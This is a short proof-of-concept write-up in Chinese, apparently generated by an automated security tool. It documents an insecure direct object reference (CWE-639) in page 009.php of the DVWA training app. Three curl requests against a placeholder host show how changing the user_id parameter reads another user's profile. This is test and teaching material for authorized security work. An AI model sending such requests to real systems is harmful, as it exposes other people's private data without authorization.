# POC — DVWA 009.php 用户资料接口通过硬编码 token 绕过访问控制导致越权读取任意用户资料

- finding_id: `LLM-7d804c24fe1b`
- type: `idor` / CWE-639
- severity: `high`
- file: `009.php:40`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/009.php'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 越权 / IDOR 载荷**  
```http
curl -sS -i -X GET 'http://TARGET:8080/009.php?action=View%20Profile&user_id=2' -H 'Cookie: user_id=1'
```
预期：返回用户 ID=2 的资料，即使 Cookie 表示当前用户 ID=1

3. **将 user_id 改为当前用户 ID 做对照**  
```http
curl -sS -i -X GET 'http://TARGET:8080/009.php?action=View%20Profile&user_id=1' -H 'Cookie: user_id=1'
```
预期：对照响应只返回当前用户资料，攻击响应返回另一用户资料

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。